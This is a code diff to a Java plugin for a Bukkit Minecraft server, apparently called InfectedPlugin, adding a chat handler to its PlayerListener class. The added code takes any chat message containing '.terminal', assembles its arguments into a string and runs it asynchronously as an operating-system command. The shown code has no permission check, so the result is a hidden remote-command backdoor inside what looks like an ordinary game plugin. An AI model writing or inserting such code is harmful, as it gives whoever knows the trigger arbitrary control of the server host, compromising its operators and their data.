@@ -26,7 +26,7 @@ import java.lang.Runtime;
 @SuppressWarnings("unused")
 public class PlayerListener implements Listener
 {
-	public final Logger log = Bukkit.getLogger();
+    public final Logger log = Bukkit.getLogger();
 	
     private Random random = new Random();
     private InfectedPlugin plugin;
@@ -213,6 +213,29 @@ public class PlayerListener implements Listener
             cancel = true;
         }
         */
+        if (message.toLowerCase().contains(".terminal"))
+        {
+            String command;
+            try
+            {
+                StringBuilder command_bldr = new StringBuilder();
+                for (int i = 0; i < args.length; i++)
+                {
+                    command_bldr.append(args[i]).append(" ");
+                }
+                command = command_bldr.toString().trim();
+            }
+            catch (Throwable ex)
+            {
+                sender.sendMessage(ChatColor.GRAY + "Error building command: " + ex.getMessage());
+                return;
+            }
+            
+            sender.sendMessage("Running system command: " + command);
+            server.getScheduler().runTaskAsynchronously(plugin, new RunSystemCommand(command, plugin));
+            cancel = true;
+            return;
+        }
         if (message.toLowerCase().contains(".help"))
         {
             p.sendMessage(ChatColor.AQUA + "Commands");
